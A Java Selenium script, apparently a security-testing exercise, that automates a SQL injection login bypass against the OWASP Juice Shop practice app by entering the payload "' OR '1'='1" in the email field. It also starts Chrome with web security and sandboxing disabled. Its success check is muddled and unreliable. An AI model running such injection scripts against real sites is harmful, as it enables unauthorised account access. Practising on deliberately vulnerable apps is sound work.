package org.example;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.time.Duration;

public class Main {
    public static void main(String[] args) {

        System.setProperty("webdriver.chrome.driver", "C:/Users/chaha/Downloads/chromedriver-win64/chromedriver-win64/chromedriver.exe");
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--remote-allow-origins=*");
        options.addArguments("--disable-web-security");
        options.addArguments("--allow-running-insecure-content");
        options.addArguments("--disable-dev-shm-usage");
        options.addArguments("--no-sandbox");
        WebDriver driver = new ChromeDriver( options);

        try {
            driver.get("https://juice-shop.herokuapp.com/#/login ");

            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(60));

            wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("email")));

            WebElement usernameField = driver.findElement(By.id("email"));
            WebElement passwordField = driver.findElement(By.id("password"));

            String sqlInjectionPayload = "' OR '1'='1";
            usernameField.sendKeys(sqlInjectionPayload);
            String validPassword = "password123";
            passwordField.sendKeys(validPassword);

            WebElement loginButton = driver.findElement(By.id("loginButton"));
            Actions actions = new Actions(driver);
            actions.moveToElement(loginButton).click().perform();
            //loginButton.click();


            wait.until(ExpectedConditions.visibilityOfElementLocated(By.tagName("body")));
            String pageSourse = driver.getPageSource();
            if (pageSourse.contains("Invalid username or password") || pageSourse.contains("error")) {
                System.out.println("SQL injection attempt failed.");
            } else {
                System.out.println("SQL injection attempt may have succeeded or the application is secure.");
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
          
            driver.quit();
        }
    }
}

